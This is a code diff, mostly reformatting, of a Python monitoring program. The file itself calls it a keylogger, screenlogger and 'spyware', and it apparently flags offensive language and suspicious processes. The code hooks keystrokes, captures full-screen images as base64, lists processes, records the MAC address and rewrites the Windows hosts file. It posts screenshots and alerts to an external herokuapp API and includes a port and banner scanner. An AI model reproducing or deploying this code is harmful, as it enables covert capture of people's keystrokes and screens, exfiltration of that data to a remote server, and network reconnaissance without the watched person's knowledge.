@@ -1,19 +1,20 @@
-import keyboard                             # For Keylogger
-from threading import Timer                 # For Keylogger
-from getmac import get_mac_address as gma   # For Mac Address
-from PIL import ImageGrab                   # For ScreenLogger
-import base64                               # For ScreenLogger
-import requests                             # For API
-import json                                 # For API
-import io                                   # For ScreenLogger
-import psutil as ps                         # For process
-import time                                 # For API
-import credenciais as cr                    # For API
+import keyboard  # For Keylogger
+from threading import Timer  # For Keylogger
+from getmac import get_mac_address as gma  # For Mac Address
+from PIL import ImageGrab  # For ScreenLogger
+import base64  # For ScreenLogger
+import requests  # For API
+import json  # For API
+import io  # For ScreenLogger
+import psutil as ps  # For process
+import time  # For API
+import credenciais as cr  # For API
 import threading
 import socket
 from IPy import IP
 
 SEND_REPORT_EVERY = 30
+
 
 def block_DNS():
     path = r"C:\Windows\System32\drivers\etc\hosts"
@@ -31,6 +32,7 @@ def block_DNS():
             else:
                 file.write(redirect + " " + site + "\n")
 
+
 def isHateSpeech(self):
     dataLogs = json.dumps({"valor": 0, "frase": self.log})
     header = {'Content-type': 'application/json'}
@@ -43,6 +45,7 @@ def isHateSpeech(self):
 
     return False
 
+
 def isBadLanguage(self):
     log_tokenized = self.log.split()
     with open('badLanguage.txt', encoding="utf8") as file:
@@ -50,6 +53,7 @@ def isBadLanguage(self):
         for word in log_tokenized:
             if word.lower() in contents:
                 return True
+
 
 def areMaliciousProcess(self):
     with open('maliciousProcess.txt', encoding="utf8") as file:
@@ -66,6 +70,7 @@ def areMaliciousProcess(self):
                 self.log = "Alerta gerado por causa do processo: " + proc.name()
                 return True
 
+
 def getProcess():
     infoSet = set()
     for proc in ps.process_iter():
@@ -77,6 +82,7 @@ def getProcess():
 
     return process
 
+
 def getImage(self):
     buffer = io.BytesIO()
     image = ImageGrab.grab()
@@ -86,6 +92,7 @@ def getImage(self):
 
     return str(b64_str)
 
+
 def doLogin(self):
     dataUser = json.dumps({"login": cr.login, "password": cr.password})
     token = requests.post("https://spyware-api.herokuapp.com/login", dataUser).text
@@ -93,6 +100,7 @@ def doLogin(self):
         'Authorization': 'Bearer ' + token,
         'Content-type': 'application/json'
     }
+
 
 def sendAlert(self):
     headers = doLogin(self)
@@ -103,7 +111,8 @@ def sendAlert(self):
                               headers=headers)
         imageJson = json.loads(image.content)
 
-        dataAlert = json.dumps({"pcId": str(gma()), "imagem": {"id": imageJson['id']}, "processos": getProcess()}, sort_keys=True, indent=4)
+        dataAlert = json.dumps({"pcId": str(gma()), "imagem": {"id": imageJson['id']}, "processos": getProcess()},
+                               sort_keys=True, indent=4)
         alert = requests.post("https://spyware-api.herokuapp.com/alerta/save", dataAlert, headers=headers)
 
         print(alert)
@@ -112,6 +121,7 @@ def sendAlert(self):
     except Exception:
         print("Error to send Alert")
         pass
+
 
 class Keylogger:
     def __init__(self, interval):
@@ -148,7 +158,6 @@ class Keylogger:
         timer.daemon = True
         timer.start()
 
-
     def start(self):
         keyboard.on_release(callback=self.callback)
         self.report()
@@ -157,35 +166,32 @@ class Keylogger:
 
 class Scanner:
     def __init__(self):
-        self.ports = []  # to store open port
-        self.banners = []  # to store open port banner
-        self.log =''
+        self.ports = []
+        self.banners = []
+        self.log = ''
 
     def banner(s):
         return s.recv(1024)
+
     def port_scanner(self, target, port):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(5)
             try:
-                target_ip = IP(target)  # check if target is an IP address
+                target_ip = IP(target)
             except:
-                target_ip = socket.gethostbyname(target)  # check if the target is a domain name or locahost
+                target_ip = socket.gethostbyname(target)
 
             s.connect((target_ip, port))
             try:
-                # get banner name
                 banner_name = self.banner(s).decode()
                 self.ports.append(port)
 
-                # store banner_name in banners list
                 self.banners.append(banner_name.strip())
             except:
                 pass
         except:
             pass
-
-    # get the banner name
 
     def scan(self):
         for port in range(1, 5051):
